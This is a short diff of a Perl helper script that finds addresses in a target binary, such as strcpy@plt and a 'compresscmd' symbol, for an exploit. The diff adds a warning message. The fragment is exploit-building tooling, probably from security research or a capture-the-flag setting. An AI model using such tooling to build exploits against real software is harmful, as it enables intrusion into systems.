@@ -22,6 +22,8 @@ prompt: print TTY "Enter the correct address: ";
 	close TTY; return eval "0x$1";
 }
 
+warn "Automatically finding exploit addresses...\n";
+
 $binary = shift or die "usage: $0 <binary> [offset before target]\n";
 $strcpy = get_addr $binary, -d => qr/.*<strcpy\@plt>/;
 $compress = get_addr $binary, -t => qr/.*\bcompresscmd\s*$/;
